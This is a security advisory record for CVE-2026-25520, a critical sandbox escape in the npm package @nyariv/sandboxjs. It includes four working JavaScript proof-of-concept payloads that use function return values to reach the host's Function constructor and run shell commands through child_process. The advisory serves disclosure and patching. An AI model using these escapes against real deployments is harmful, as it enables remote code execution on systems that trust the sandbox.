advisory_id: GHSA-58jh-xv4v-pcx4
datasource_id: github_osv_importer_v2/GHSA-58jh-xv4v-pcx4
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-58jh-xv4v-pcx4/GHSA-58jh-xv4v-pcx4.json
aliases:
  - CVE-2026-25520
summary: "@nyariv/sandboxjs has a Sandbox Escape issue\n### Summary\n\nThe return values of\
  \ functions aren't wrapped. `Object.values`/`Object.entries` can be used to get an Array containing\
  \ the host's `Function` constructor, by using `Array.prototype.at` you can obtain the hosts\
  \ `Function` constructor, which can be used to execute arbitrary code outside of the sandbox.\n\
  \n### Details\n\nThe return values of functions aren't wrapped, chaining function calls allows\
  \ bypassing most validation/sanitization. \n\n### PoC\n\n```js\nconst s = require('@nyariv/sandboxjs').default;\n\
  const sb = new s();\n\npayload = `\nconsole.log(\n  Object.values(this).at(0)(\n    \"return\
  \ process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n);\n\
  `\n\nsb.compile(payload)().run();\n```\n\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\n\
  const sb = new s();\n\npayload = `\nconsole.log(\n  Object.entries(this)[0].at(1)(\n    \"\
  return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n\
  );\n`\n\nsb.compile(payload)().run();\n```\n\n```js\nconst s = require(\"@nyariv/sandboxjs\"\
  ).default;\nconst sb = new s();\n\npayload = `\nconsole.log(\n  Object.entries(this)\n   \
  \ .at(0)\n    .map((f) => {\n      if (typeof f === 'function') {\n        f.call('', 'return\
  \ process')()\n          .getBuiltinModule('child_process')\n          .execSync('ls -lah',\
  \ { stdio: 'inherit' });\n      }\n    }),\n);\n`\n\nsb.compile(payload)().run();\n```\n\n\
  ```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload =\
  \ `\nconst t = (f) => {\n  f.call('', 'return process')()\n    .getBuiltinModule('child_process')\n\
  \    .execSync('ls -lah', { stdio: 'inherit' });\n};\nconsole.log(t.call(...Object.entries(this)[0]));\n\
  `\n\nsb.compile(payload)().run();\n```\n\n### Impact\n\nSanbox Escape -> RCE"
impacted_packages:
  - purl: pkg:npm/%40nyariv/sandboxjs
    affected_versions: vers:npm/<=0.8.28
    fixed_versions: vers:npm/0.8.29
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '10.0'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-58jh-xv4v-pcx4/GHSA-58jh-xv4v-pcx4.json
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-74
references:
  - url: https://github.com/nyariv/SandboxJS
    reference_type:
    reference_id:
  - url: https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3
    reference_type:
    reference_id:
  - url: https://github.com/nyariv/SandboxJS/security/advisories/GHSA-58jh-xv4v-pcx4
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25520
    reference_type:
    reference_id:
